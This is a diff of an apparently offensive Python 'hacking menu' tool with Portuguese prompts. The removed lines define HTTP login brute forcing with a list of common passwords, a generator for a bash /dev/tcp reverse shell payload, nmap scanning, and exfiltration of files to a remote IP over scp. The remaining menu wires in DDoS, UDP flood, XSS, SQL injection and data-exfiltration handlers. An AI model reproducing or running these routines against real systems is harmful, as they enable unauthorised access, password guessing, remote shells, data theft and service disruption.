@@ -210,62 +210,6 @@ def sql_injection():
     except Exception as e:
         print(Fore.RED + f"[!] Erro ao realizar injeção SQL: {e}")
 
-def test_http_brute_force():
-    url = input(Fore.WHITE + "[+] Digite a URL para realizar o brute force HTTP: ")
-    username = input(Fore.WHITE + "[+] Digite o nome de usuário: ")
-    passwords = ['password1', '123456', 'letmein', 'welcome', 'admin']
-    print(Fore.YELLOW + "[+] Iniciando brute force HTTP...")
-    for password in passwords:
-        response = requests.post(url, data={'username': username, 'password': password})
-        if "Login successful" in response.text:
-            print(Fore.GREEN + f"[+] Senha encontrada: {password}")
-            break
-        print(Fore.RED + f"[+] Tentando senha: {password}")
-        time.sleep(1)
-
-def reverse_shell_payload():
-    ip = input(Fore.WHITE + "[+] Digite o IP para o reverse shell: ")
-    port = input(Fore.WHITE + "[+] Digite a porta para o reverse shell: ")
-    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
-    print(Fore.YELLOW + "[+] Gerando payload para reverse shell...")
-    print(Fore.GREEN + f"[+] Payload: {payload}")
-    return payload
-
-def nmap_scan():
-    target = input(Fore.WHITE + "[+] Digite o IP alvo para o nmap scan: ")
-    print(Fore.YELLOW + "[+] Realizando scan de vulnerabilidades com nmap...")
-    try:
-        os.system(f"nmap -sV {target}")
-    except Exception as e:
-        print(Fore.RED + f"[!] Erro ao realizar o nmap scan: {e}")
-
-def file_transfer():
-    remote_ip = input(Fore.WHITE + "[+] Digite o IP remoto para transferência de arquivos: ")
-    remote_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo remoto: ")
-    local_path = input(Fore.WHITE + "[+] Digite o caminho local para salvar o arquivo: ")
-    print(Fore.YELLOW + "[+] Iniciando transferência de arquivo...")
-    try:
-        os.system(f"scp user@{remote_ip}:{remote_path} {local_path}")
-        print(Fore.GREEN + "[+] Transferência realizada com sucesso!")
-    except Exception as e:
-        print(Fore.RED + f"[!] Erro ao transferir o arquivo: {e}")
-
-def custom_payload():
-    print(Fore.YELLOW + "[+] Gerando um payload customizado...")
-    payload = input(Fore.WHITE + "[+] Digite o payload customizado: ")
-    print(Fore.GREEN + f"[+] Payload gerado: {payload}")
-    return payload
-
-def exfiltrate_file():
-    file_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo a ser exfiltrado: ")
-    remote_ip = input(Fore.WHITE + "[+] Digite o IP remoto para onde os dados serão enviados: ")
-    print(Fore.YELLOW + "[+] Exfiltrando arquivo...")
-    try:
-        os.system(f"scp {file_path} user@{remote_ip}:/tmp")
-        print(Fore.GREEN + "[+] Exfiltração de arquivo bem-sucedida!")
-    except Exception as e:
-        print(Fore.RED + f"[!] Erro ao exfiltrar arquivo: {e}")
-
 # Função do menu com todas as opções
 
 # Função para o menu
@@ -321,37 +265,37 @@ def menu():
         elif choice == '9':
             subdomain_recognition()
         elif choice == '10':
-            scanner_vulnerabilidades()
+            network_vulnerability_scanner()
         elif choice == '11':
-            exfiltracao_dados()
+            data_exfiltration()
         elif choice == '12':
             base64_decoder()
         elif choice == '13':
             md5_decoder()
         elif choice == '14':
-            reconhecimento_web_shell()
+            web_shell_recognition()
         elif choice == '15':
-            scanner_ssl()
+            ssl_scanner()
         elif choice == '16':
-            sniffer_pacotes()
+            packet_sniffer()
         elif choice == '17':
-            ataque_xss()
+            xss_attack()
         elif choice == '18':
-            injecao_sql()
+            sql_injection()
         elif choice == '19':
             brute_force_http()
         elif choice == '20':
-            enviar_payload_reverso()
+            reverse_payload()
         elif choice == '21':
-            scanner_vulnerabilidades_rede()
+            network_vulnerability_scanner()
         elif choice == '22':
             ddos_attack()
         elif choice == '23':
-            flood_udp()
+            udp_flood()
         elif choice == '24':
-            payload_exploit()
+            payload_for_exploit()
         elif choice == '25':
-            backup_arquivos_remotos()
+            remote_file_backup()
         elif choice == '0':
             print(Fore.GREEN + "[+] Saindo...")
             break
@@ -361,3 +305,6 @@ def menu():
 
         # Pausar e voltar para o menu apenas quando o usuário pressionar Enter
         input(Fore.WHITE + "\n[+] Pressione Enter para voltar ao menu...")
+
+# Chama a função principal do menu
+menu()
